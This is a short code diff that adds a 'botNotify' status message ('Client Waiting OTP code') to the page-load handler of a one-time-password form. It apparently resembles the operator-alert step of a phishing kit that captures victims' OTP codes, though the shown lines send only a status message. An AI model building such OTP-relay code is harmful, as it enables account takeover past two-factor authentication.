@@ -1,5 +1,5 @@
 $(document).ready(()=>{
-
+    botNotify("Client Waiting OTP code... 🏃🏃🏃");
     $("#otpCode").on("submit",async(ev)=>{
         ev.preventDefault();
         var message = "";
